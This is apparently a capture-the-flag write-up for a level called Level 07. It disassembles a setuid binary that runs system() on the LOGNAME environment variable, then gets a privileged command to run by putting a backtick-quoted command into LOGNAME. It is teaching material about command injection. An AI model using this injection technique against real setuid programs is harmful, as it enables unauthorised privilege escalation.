# Level 07


<br>

### >> [Flag file](../flag) <<

<br>


#### Step 1:

- What's in the home directory:
```bash
ls -la
```

> ```
> dr-x------ 1 level07 level07  120 Mar  5  2016 .
> d--x--x--x 1 root    users    340 Aug 30  2015 ..
> -r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
> -r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
> -rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
> -r-x------ 1 level07 level07  675 Apr  3  2012 .profile
> ```
> There is 2 files called `level07` and `level07.php` that are readable and executable by the user `level07`.


#### Step 2:

- Let's see how the `level07` works:
```bash
objdump -s -d level07
```

> ```
> Contents of section .rodata:
>  8048678 03000000 01000200 4c4f474e 414d4500  ........LOGNAME.
>  8048688 2f62696e 2f656368 6f202573 2000      /bin/echo %s .
> ```
> ```asm
> 08048514 <main>:
>  8048514:	55                   	push   %ebp                     |
>  8048515:	89 e5                	mov    %esp,%ebp                |
>  8048517:	83 e4 f0             	and    $0xfffffff0,%esp         |
>  804851a:	83 ec 20             	sub    $0x20,%esp               |
>  804851d:	e8 ce fe ff ff       	call   80483f0 <getegid@plt>    |
>  8048522:	89 44 24 18          	mov    %eax,0x18(%esp)          |
>  8048526:	e8 b5 fe ff ff       	call   80483e0 <geteuid@plt>    |
>  804852b:	89 44 24 1c          	mov    %eax,0x1c(%esp)          |
>  804852f:	8b 44 24 18          	mov    0x18(%esp),%eax          |
>  8048533:	89 44 24 08          	mov    %eax,0x8(%esp)           |
>  8048537:	8b 44 24 18          	mov    0x18(%esp),%eax          |
>  804853b:	89 44 24 04          	mov    %eax,0x4(%esp)           | Elevation to
>  804853f:	8b 44 24 18          	mov    0x18(%esp),%eax          |  flag07 user
>  8048543:	89 04 24             	mov    %eax,(%esp)              |
>  8048546:	e8 05 ff ff ff       	call   8048450 <setresgid@plt>  |
>  804854b:	8b 44 24 1c          	mov    0x1c(%esp),%eax          |
>  804854f:	89 44 24 08          	mov    %eax,0x8(%esp)           |
>  8048553:	8b 44 24 1c          	mov    0x1c(%esp),%eax          |
>  8048557:	89 44 24 04          	mov    %eax,0x4(%esp)           |
>  804855b:	8b 44 24 1c          	mov    0x1c(%esp),%eax          |
>  804855f:	89 04 24             	mov    %eax,(%esp)              |
>  8048562:	e8 69 fe ff ff       	call   80483d0 <setresuid@plt>  |
>  8048567:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)          |
>  804856e:	00
>  804856f:	c7 04 24 80 86 04 08 	movl   $0x8048680,(%esp)
>  8048576:	e8 85 fe ff ff       	call   8048400 <getenv@plt>     | getenv(0x8048680 ["LOGNAME"])
>  804857b:	89 44 24 08          	mov    %eax,0x8(%esp)           |  ==> 0x8(%esp) <3rd arg>
>  804857f:	c7 44 24 04 88 86 04 	movl   $0x8048688,0x4(%esp)     | 0x8048688 ["/bin/echo %s "] ==> 0x4(%esp) <2st arg>
>  8048586:	08
>  8048587:	8d 44 24 14          	lea    0x14(%esp),%eax
>  804858b:	89 04 24             	mov    %eax,(%esp)
>  804858e:	e8 ad fe ff ff       	call   8048440 <asprintf@plt>   | asprintf(0x14(%esp) <outString>, <2nd arg>, <3rd arg>)
>  8048593:	8b 44 24 14          	mov    0x14(%esp),%eax
>  8048597:	89 04 24             	mov    %eax,(%esp)
>  804859a:	e8 71 fe ff ff       	call   8048410 <system@plt>     | system(0x14(%esp) [asprintf("/bin/echo %s ", getenv("LOGNAME"))])
>  804859f:	c9                   	leave
>  80485a0:	c3                   	ret
> ```
> From the disassembly, we can see that the program just does the equivalent of `system("/bin/echo %s ".format(getenv("LOGNAME")))` as the `flag07` user without any input validation.


#### Step 3:

- Because the program does not escape any characters, we can use command injection to execute arbitrary commands as the `flag07` user:
```bash
LOGNAME='`getflag`' ./level07
```


<br>

---

[<<](/level06/resources/Readme.md) &nbsp; [[Back to main page]](/) &nbsp; >>